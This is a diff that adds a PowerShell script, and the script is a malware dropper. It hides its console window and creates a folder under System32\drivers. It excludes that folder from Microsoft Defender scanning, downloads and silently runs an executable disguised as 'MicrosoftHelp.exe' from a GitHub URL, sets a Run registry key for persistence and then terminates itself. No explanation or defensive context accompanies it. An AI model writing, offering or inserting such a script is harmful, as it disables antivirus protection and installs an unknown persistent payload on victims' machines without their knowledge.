@@ -1,0 +1,38 @@
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+
+$consolePtr = [Win32]::GetConsoleWindow()
+[Win32]::ShowWindow($consolePtr, 0)
+
+$targetPath = "C:\Windows\System32\drivers\UMDF"
+
+if (-not (Test-Path $targetPath)) {
+    New-Item -Path $targetPath -ItemType Directory -Force | Out-Null
+}
+
+Add-MpPreference -ExclusionPath $targetPath
+
+$url = "https://github.com/denemeknkanlarsinya/winhe/raw/refs/heads/main/MicrosoftHelp.exe"
+$fileName = "MicrosoftHelp.exe"
+$outFile = Join-Path -Path $targetPath -ChildPath $fileName
+
+Invoke-WebRequest -Uri $url -OutFile $outFile
+
+Start-Process $outFile -WindowStyle Hidden
+
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "MicrosoftHelp"
+Set-ItemProperty -Path $regPath -Name $regName -Value "`"$outFile`""
+
+Start-Sleep -Milliseconds 500
+
+Stop-Process -Id $PID
